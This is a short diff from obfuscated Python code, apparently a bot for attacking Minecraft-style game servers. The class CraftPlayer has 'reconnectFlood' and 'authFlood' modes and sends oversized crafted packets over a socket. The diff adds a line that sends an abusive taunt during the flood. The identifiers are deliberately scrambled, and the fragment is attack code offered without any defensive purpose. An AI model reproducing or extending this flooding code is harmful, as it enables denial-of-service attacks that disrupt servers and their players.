@@ -287,6 +287,7 @@ class CraftPlayer :
                     OO0OOOO0O00O0OO00 ._socket .sendall ('\x01'+CraftString ('aaaaaaaaaaaaaaa;'+'a'*500 ))
                     OO0OOOO0O00O0OO00 ._socket .close ()
                 if OOO0000OO0O0000OO =='reconnectFlood':
+                    OO0OOOO0O00O0OO00 .SendPacket ('n0 s3curity w4s f0und bitch')
                     OO0OOOO0O00O0OO00 ._socket .close ()
                     OO0OOOO0O00O0OO00 ._log ('Reconnecting...')
                 if OOO0000OO0O0000OO =='authFlood':
